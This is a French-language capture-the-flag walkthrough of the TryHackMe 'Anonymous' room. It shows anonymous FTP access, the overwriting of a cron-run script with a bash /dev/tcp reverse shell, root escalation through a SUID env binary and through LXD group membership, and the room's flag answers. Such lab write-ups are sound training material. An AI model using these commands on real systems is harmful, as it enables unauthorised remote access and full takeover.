---
icon: caret-right
description: Challenge niveau medium du site TryHackMe
---

# \[Anonymous]\[CTF]\[TryHackMe]

<figure><img src=".gitbook/assets/THM-thumnail-anonymous.png" alt=""><figcaption><p>Anonymous Thumbnail</p></figcaption></figure>

Lien vers TryHackMe: [https://tryhackme.com/r/room/anonymous](https://tryhackme.com/r/room/anonymous)

## \[Task 1] Enumérations

Commençons par les énumérations classiques

### 1. Nmap

```sh
# Nmap 7.94SVN scan initiated Thu Dec  5 10:43:13 2024 as: /usr/lib/nmap/nmap --privileged -A -p- -oN nmap.txt -T4 10.10.42.241
Nmap scan report for 10.10.42.241
Host is up (0.028s latency).
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.2.92
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=12/5%OT=21%CT=1%CU=30534%PV=Y%DS=2%DC=T%G=Y%TM=6751
OS:75D6%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=103%TI=Z%CI=Z%II=I%TS=A)
OS:SEQ(SP=103%GCD=1%ISR=104%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=104%GCD=1%ISR=104%TI
OS:=Z%CI=Z%II=I%TS=9)SEQ(SP=105%GCD=1%ISR=105%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=10
OS:5%GCD=2%ISR=105%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M508ST11NW7%O2=M508ST11NW7%O3
OS:=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST11NW7%O6=M508ST11)WIN(W1=F4B3%W2=F
OS:4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW
OS:7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF
OS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=
OS:%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=
OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI
OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2024-12-05T09:43:49+00:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-12-05T09:43:49
|_  start_date: N/A

TRACEROUTE (using port 3306/tcp)
HOP RTT      ADDRESS
1   29.56 ms 10.9.0.1
2   29.59 ms 10.10.42.241

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Dec  5 10:43:50 2024 -- 1 IP address (1 host up) scanned in 37.07 seconds

```

Nous trouvons un **FTP anonymous** en 21 et la présence du **service SMB** en 139/245

### 2. SMB

```
┌──(kali㉿kali)-[~/THM/anonymous]
└─$ smbclient -L $IP -N

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	pics            Disk      My SMB Share Directory for Pics
	IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            ANONYMOUS
```

Nous avons trouvé un share appelé **pics,** voyons ce qu'il contient

```
┌──(kali㉿kali)-[~/THM/anonymous]
└─$ smbclient //$IP/pics -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun May 17 13:11:34 2020
  ..                                  D        0  Thu May 14 03:59:10 2020
  corgo2.jpg                          N    42663  Tue May 12 02:43:42 2020
  puppos.jpeg                         N   265188  Tue May 12 02:43:42 2020

		20508240 blocks of size 1024. 13306812 blocks available

```

Le partage (share smb) contient deux fichiers images. J'ai téléchargé (get) les deux images et je les ai travaillées avec les [outils de stéganographie](outils.md#id-8.-outils-steganographie) les plus connus et je n'ai rien trouvé ! J'ai perdu un certain temps pour me rendre compte que finalement cela ne menait à rien, ce que les anglo-saxons appèllent un 'Rabbit Hole' .

### 3. Réponses aux questions jusqu'à présent

<table><thead><tr><th width="495">Questions</th><th>Réponses</th></tr></thead><tbody><tr><td>Enumerate the machine. How many ports are open?</td><td>4</td></tr><tr><td>What service is running on port 21?</td><td>FTP</td></tr><tr><td>What service is running on ports 139 and 445?</td><td>SMB</td></tr><tr><td>There's a share on the user's computer.  What's it called?</td><td>pics</td></tr></tbody></table>

## \[Task 2] Exploitation

### 1. Port 21 - FTP anonymous

Nmap nous a montré que le port 21 supportait le FTP anonyme. Conectons-nous avec l'utilisateur 'anonymous' et un mot de passe vide.

```
┌──(kali㉿kali)-[~/THM/anonymous]
└─$ ftp $IP
Connected to 10.10.166.173.
220 NamelessOne's FTP Server!
Name (10.10.166.173:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

Explorons le répertoire

```
ftp> dir
229 Entering Extended Passive Mode (|||51479|)
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts
226 Directory send OK.
ftp> cd scripts
250 Directory successfully changed.
ftp> dir
229 Entering Extended Passive Mode (|||22147|)
150 Here comes the directory listing.
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000         2193 Dec 13 15:45 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
226 Directory send OK.
```

Et téléchargeons les fichiers trouvés

```
ftp> get clean.sh
local: clean.sh remote: clean.sh
229 Entering Extended Passive Mode (|||13395|)
150 Opening BINARY mode data connection for clean.sh (314 bytes).
100% |**************************************************************************|   314      162.15 KiB/s    00:00 ETA
226 Transfer complete.
314 bytes received in 00:00 (11.29 KiB/s)
ftp> get removed_files.log
local: removed_files.log remote: removed_files.log
229 Entering Extended Passive Mode (|||17137|)
150 Opening BINARY mode data connection for removed_files.log (2236 bytes).
100% |**************************************************************************|  2236       15.01 MiB/s    00:00 ETA
226 Transfer complete.
2236 bytes received in 00:00 (91.60 KiB/s)
ftp> get to_do.txt
local: to_do.txt remote: to_do.txt
229 Entering Extended Passive Mode (|||44674|)
150 Opening BINARY mode data connection for to_do.txt (68 bytes).
100% |**************************************************************************|    68      289.98 KiB/s    00:00 ETA
226 Transfer complete.
68 bytes received in 00:00 (2.64 KiB/s)
ftp>
```

Contenu de clean.sh

```bash
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```

clean.sh va vider le répertoire /tmp et écrire le résultat son action dans le fichier removed\_files.log.

Le Hint de TryHackMe nous dit de nous intéresser au fichier log. Voyons ce qu'il contient:

```
┌──(kali㉿kali)-[~/THM/anonymous]
└─$ cat removed_files.log
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
...
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
                                            
```

Le contenu du fichier log nous montre que clean.sh s'exécute très souvent, probablement toute les minutes via un cron job.

Remarquons également que **nous avons les droit en écriture sur le fichier clean.sh**

```
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
```

### 2. Prise pied sur la machine cible

Remplaçons le fichier clean.sh par notre propre fichier clean.sh qui va appeler un Reverse Shell.

Avec l'aide de  [https://www.revshells.com/](https://www.revshells.com/) editons clean.sh, rendons le exécutable, uploadons le fichier vers la machine cible via FTP anonymous et attendons le reverse shell avec nc&#x20;

```bash
┌──(kali㉿kali)-[~/THM/anonymous]
└─$ cat clean.sh       
#!/bin/bash

bash -i >& /dev/tcp/10.9.3.195/12345 0>&1
```

```
chmod +x clean.sh
ftp anonymous@$IP
cd scripts
put clean.sh
nc -lvnp 12345
```

```
/┌──(kali㉿kali)-[~/THM/anonymous]
└─$ nc -lvnp 12345
listening on [any] 12345 ...
connect to [10.9.3.195] from (UNKNOWN) [10.10.238.90] 52170
bash: cannot set terminal process group (1371): Inappropriate ioctl for device
bash: no job control in this shell
namelessone@anonymous:~$ 
```

```
namelessone@anonymous:~$ whoami
whoami
namelessone
namelessone@anonymous:~$ id
id
uid=1000(namelessone) gid=1000(namelessone) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
namelessone@anonymous:~$
```

[Consolidons le shell](outils.md#id-6.-consolidation-dun-shell)

```
namelessone@anonymous:~$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
namelessone@anonymous:~$ ^Z
zsh: suspended  nc -lvnp 12345
                                                                                                                       
┌──(kali㉿kali)-[~/THM/anonymous]
└─$ stty raw -echo; fg              
[1]  + continued  nc -lvnp 12345
                                export TERM=xterm
namelessone@anonymous:~$ stty cols 132 rows 34
namelessone@anonymous:~$
```

### 3. User.txt

```
namelessone@anonymous:~$ ls -l
total 8
drwxr-xr-x 2 namelessone namelessone 4096 May 17  2020 pics
-rw-r--r-- 1 namelessone namelessone   33 May 11  2020 user.txt
namelessone@anonymous:~$ cat user.txt
90d6f992585815ff991e68748c414740
namelessone@anonymous:~$
```



## \[Task 3] Escalade de privilèges

Utilisons ma [méthode d'escalade de privilèges](outils.md#id-5.-privilege-escalation)

### 1. sudo -l

Comme nous n'avons pas le password de namelessone, sudo -l n'apporte rien.

### 2. suid3num

Dans le répertoire contenant suid3num.py

```
┌──(kali㉿kali)-[~/utilitaires]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Sur la machine cible

```
namelessone@anonymous:/dev/shm$ wget 10.9.3.195:8000/suid3num.py
--2024-12-16 15:07:59--  http://10.9.3.195:8000/suid3num.py
Connecting to 10.9.3.195:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16632 (16K) [text/x-python]
Saving to: ‘suid3num.py’

suid3num.py                        0%[                                                           ]       0  --.-KB/s   suid3num.py                      100%[==========================================================>]  16.24K  --.-KB/s    in 0.03s   

2024-12-16 15:07:59 (603 KB/s) - ‘suid3num.py’ saved [16632/16632]

namelessone@anonymous:/dev/shm$ chmod +x suid3num.py
namelessone@anonymous:/dev/shm$ python3 suid3num.py
```

<figure><img src=".gitbook/assets/suid3num (1).png" alt=""><figcaption></figcaption></figure>

### 3. root.txt

Comme trouvé par suid3num.py lançons un root shell et afficons le root.txt

```
namelessone@anonymous:/dev/shm$ /usr/bin/env /bin/sh -p
# id
uid=1000(namelessone) gid=1000(namelessone) euid=0(root) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
# whoami
root
# cat /root/root.txt
4d930091c31a622a7ed10f27999af363
#
```



### 4. Réponses aux questions

| Questions | Réponses                         |
| --------- | -------------------------------- |
| user.txt  | 90d6f992585815ff991e68748c414740 |
| root.txt  | 4d930091c31a622a7ed10f27999af363 |

## Bonus LXD

Si nous analysons les groupes dont namelessone fait partie, nous remarquons qu'il est membre du groupe **lxd**

```
uid=1000(namelessone) gid=1000(namelessone) groups=1000(namelessone),
4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

Nous pouvons donc utiliser l[**'escalade de privilèges via LXD**](outils.md#id-7.-escalade-de-privileges-via-lxd)



### 1. sur la machine Kali

```
┌──(kali㉿kali)-[~/THM/anonymous]
└─$ git clone  https://github.com/saghul/lxd-alpine-builder.git
Cloning into 'lxd-alpine-builder'...
remote: Enumerating objects: 50, done.
remote: Counting objects: 100% (8/8), done.
remote: Compressing objects: 100% (6/6), done.
remote: Total 50 (delta 2), reused 5 (delta 2), pack-reused 42 (from 1)
Receiving objects: 100% (50/50), 3.11 MiB | 18.42 MiB/s, done.
Resolving deltas: 100% (15/15), done.
                                                                                                                       
┌──(kali㉿kali)-[~/THM/anonymous]
└─$ cd lxd-alpine-builder 
                                                                                                                       
┌──(kali㉿kali)-[~/THM/anonymous/lxd-alpine-builder]
└─$ sudo ./build-alpine
Determining the latest release... v3.21
Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.21/main/x86_64
Downloading alpine-keys-2.5-r0.apk
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
...
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
Downloading apk-tools-static-2.14.6-r2.apk
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
ERROR: checksum is missing for sha256.alpine-devel@lists.alpinelinux.org-6165ee59.rsa.pub
Failed to download a valid static apk
                                                                                                                       
┌──(kali㉿kali)-[~/THM/anonymous/lxd-alpine-builder]
└─$ ls -l
total 3228
-rw-rw-r-- 1 kali kali 3259593 Dec 16 16:51 alpine-v3.13-x86_64-20210218_0139.tar.gz
-rwxrwxr-x 1 kali kali    8060 Dec 16 16:51 build-alpine
-rw-rw-r-- 1 kali kali   26530 Dec 16 16:51 LICENSE
-rw-rw-r-- 1 kali kali     768 Dec 16 16:51 README.md
drwxr-xr-x 5 root root    4096 Dec 16 16:52 rootfs
                                                                                                                       
┌──(kali㉿kali)-[~/THM/anonymous/lxd-alpine-builder]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...


```

### 2. sur la machine cible

```
namelessone@anonymous:/dev/shm$ wget 10.9.3.195:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
--2024-12-16 15:35:02--  http://10.9.3.195:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
Connecting to 10.9.3.195:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3259593 (3.1M) [application/gzip]
Saving to: ‘alpine-v3.13-x86_64-20210218_0139.tar.gz’

                alpine-v3.13-x86   0%[                                                           ]       0  --.-KB/s                  alpine-v3.13-x86_   2%[>                                                          ]  88.47K   227KB/s                 alpine-v3.13-x86_6   6%[==>                                                        ] 200.47K   166KB/s                alpine-v3.13-x86_64  25%[==============>                                            ] 825.09K   583KB/s               alpine-v3.13-x86_64-  46%[==========================>                                ]   1.43M   906KB/s              alpine-v3.13-x86_64-2  69%[=======================================>                   ]   2.15M  1.17MB/s             alpine-v3.13-x86_64-20  92%[=====================================================>     ]   2.87M  1.41MB/s   alpine-v3.13-x86_64-20210218_013 100%[==========================================================>]   3.11M  1.46MB/s    in 2.1s    

2024-12-16 15:35:05 (1.46 MB/s) - ‘alpine-v3.13-x86_64-20210218_0139.tar.gz’ saved [3259593/3259593]

namelessone@anonymous:/dev/shm$ lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
If this is your first time running LXD on this machine, you should also run: lxd init
To start your first container, try: lxc launch ubuntu:18.04

Image imported with fingerprint: cd73881adaac667ca3529972c7b380af240a9e3b09730f8c8e4e6a23e1a7892b
namelessone@anonymous:/dev/shm$ lxc image list
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
| myimage | cd73881adaac | no     | alpine v3.13 (20210218_01:39) | x86_64 | 3.11MB | Dec 16, 2024 at 3:36pm (UTC) |
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
namelessone@anonymous:/dev/shm$ lxc init myimage mycontainer -c security.privileged=true
Creating mycontainer
Error: No storage pool found. Please create a new storage pool
namelessone@anonymous:/dev/shm$ lxd init
Would you like to use LXD clustering? (yes/no) [default=no]: 
Do you want to configure a new storage pool? (yes/no) [default=yes]: 
Name of the new storage pool [default=default]: 
Name of the storage backend to use (btrfs, dir) [default=btrfs]: 
Create a new BTRFS pool? (yes/no) [default=yes]: 
Would you like to use an existing block device? (yes/no) [default=no]: 
Size in GB of the new loop device (1GB minimum) [default=15GB]: 
Would you like to connect to a MAAS server? (yes/no) [default=no]: 
Would you like to create a new local network bridge? (yes/no) [default=yes]: 
What should the new bridge be called? [default=lxdbr0]: 
What IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
Would you like LXD to be available over the network? (yes/no) [default=no]: 
Would you like stale cached images to be updated automatically? (yes/no) [default=yes] 
Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]: 
namelessone@anonymous:/dev/shm$ lxc init myimage mycontainer -c security.privileged=true
Creating mycontainer
namelessone@anonymous:/dev/shm$ lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to mycontainer
namelessone@anonymous:/dev/shm$ lxc start mycontainer
namelessone@anonymous:/dev/shm$ lxc exec mycontainer /bin/sh
~ # whoami
root
~ # cd /mnt/root
/mnt/root # ls -l
total 4015200
drwxr-xr-x    2 root     root          4096 May 13  2020 bin
drwxr-xr-x    3 root     root          4096 May 13  2020 boot
drwxr-xr-x    2 root     root          4096 May 11  2020 cdrom
drwxr-xr-x   17 root     root          3700 Dec 16 14:17 dev
drwxr-xr-x   96 root     root          4096 Jun  4  2020 etc
drwxr-xr-x    3 root     root          4096 May 11  2020 home
drwxr-xr-x   22 root     root          4096 May 11  2020 lib
drwxr-xr-x    2 root     root          4096 Feb  3  2020 lib64
drwx------    2 root     root         16384 May 11  2020 lost+found
drwxr-xr-x    2 root     root          4096 Feb  3  2020 media
drwxr-xr-x    2 root     root          4096 Feb  3  2020 mnt
drwxr-xr-x    2 root     root          4096 Feb  3  2020 opt
dr-xr-xr-x  138 root     root             0 Dec 16 14:17 proc
drwx------    6 root     root          4096 May 17  2020 root
drwxr-xr-x   28 root     root           920 Dec 16 15:37 run
drwxr-xr-x    2 root     root         12288 May 13  2020 sbin
drwxr-xr-x    4 root     root          4096 May 11  2020 snap
drwxr-xr-x    3 root     root          4096 May 14  2020 srv
-rw-------    1 root     root     4111466496 May 11  2020 swap.img
dr-xr-xr-x   13 root     root             0 Dec 16 14:17 sys
drwxrwxrwt    9 root     root          4096 Dec 16 15:36 tmp
drwxr-xr-x   10 root     root          4096 Feb  3  2020 usr
drwxr-xr-x   14 root     root          4096 May 13  2020 var
/mnt/root # cat root/root.txt
4d930091c31a622a7ed10f27999af363
/mnt/root #
```
